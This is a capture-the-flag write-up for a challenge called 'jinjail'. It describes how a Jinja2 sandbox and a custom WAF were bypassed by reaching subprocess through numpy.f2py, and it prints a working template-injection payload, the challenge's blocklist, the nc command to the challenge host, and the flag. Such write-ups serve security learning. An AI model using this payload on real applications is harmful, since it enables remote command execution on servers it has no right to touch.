
## Misc — jinjail

Author: **daffainfo**

Pyjail? No, this is JinJail!

**TL;DR**

- found numpy.f2py have os and subprocess exposed, allowing execution of system commands without `import`

**FLAG**

`C2C{damnnn_i_love_numpy_d6345f2227b7}`

**Exploration**

- we are provided with a python application running a jinja2 template engine with a custom WAF and sandboxed environment
- the env explicitly exposes numpy as a global variable `env.globals["numpy"] = numpy`
- the goal is to execute the command `/fix help` to retrieve the flag

fix.c:

```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>

int main(int argc, char *argv[]) {
    if (argc > 1 && strcasecmp(argv[1], "help") == 0) {
        setuid(0);
        system("cat /root/flag.txt");
    } else {
        printf("Nope, you didnt ask for help...\n");
    }
    return 0;
}
```

there are few things that neeeds to be bypassed: 

1. length limit of 275 characters
2. allowed chars: alphanumeric, punctuation, space
3. lots of keywords: `fromfile`, `savetxt`, `load`, `array`, `packbits`, `ctypes`, `eval`, `exec`, `breakpoint`, `input`, `+`, `-`, `/`, `\`, `|`, `"`, `'`
4. character counts: `(` `)` `[` `]` `{` `}`: max 3 each. `,`: max 10.
5. sandbox environment, no access to dangerous attributes

app.py:

```python
def waf(content):
    allowlist = set(string.ascii_lowercase + string.ascii_uppercase + string.punctuation + string.digits + ' ')
    blocklist = ['fromfile', 'savetxt', 'load', 'array', 'packbits', 'ctypes', 'eval', 'exec', 'breakpoint', 'input', '+', '-', '/', '\\', '|', '"', "'"]
    char_limits = {
        '(': 3,
        ')': 3,
        '[': 3,
        ']': 3,
        '{': 3,
        '}': 3,
        ',': 10
    }

    if len(content) > 275:
        raise ValueError("Nope")

    for ch in content:
        if ch not in allowlist:
            raise ValueError("Nope")

    lower_value = content.lower()
    for blocked in blocklist:
        if blocked.lower() in lower_value:
            raise ValueError("Nope")

    counter = Counter(ch for ch in content if ch in char_limits)
    for ch, count in counter.items():
        if count > char_limits[ch]:
            raise ValueError("Nope")
```

used ai to scan for gadgets in numpy and we found numpy.f2py.os and numpy.f2py.subprocess exposed, allowing execution of system commands without `import` 

<aside>
💡

[https://numpy.org/doc/stable/f2py/](https://numpy.org/doc/stable/f2py/)

</aside>

now to construct the string `/fix help`

→ since quotes are blocked, we used `dict(key=val)` to generate string representations like `{'key': 1}` which contain the key name and spaces and we used Jinja2's `~` operator for string concatenation.

→ to bypass the strict bracket limit, we used a {% set ... %} block to define helper variables `f` and `h` containing the string representations of `{'fix': 1}` and `{'help': 1}`

→ we then sliced these strings to extract `"fix"`, `" "`, and `"help"`, and combined them with numpy.f2py.os.sep (`/`) to form the command `/fix help`

the constructed final payload:

```python
{% set f,h = dict(fix=1)~1,dict(help=1)~1 %}{{ numpy.f2py.subprocess.getoutput(numpy.f2py.os.sep ~ f[2:5] ~ f[7] ~ h[2:6]) }}
```

- `set f,h = ...`: defines f as "{'fix': 1}1" and h as "{'help': 1}1"
- `numpy.f2py.os.sep`: provides /
- `f[2:5]`: extracts "fix" from the dictionary string
- `f[7]`: extracts " " (space) from the dictionary string
- `h[2:6]`: extracts "help" from the dictionary string
- Result: Executed command is /fix help, which prints the flag.

**Exploit command to reproduce**

```python
$ nc challenges.1pc.tf 46599
>>> {% set f,h = dict(fix=1)~1,dict(help=1)~1 %}{{ numpy.f2py.subprocess.getoutput(numpy.f2py.os.sep ~ f[2:5] ~ f[7] ~ h[2:6]) }}
C2C{damnnn_i_love_numpy_d6345f2227b7}
```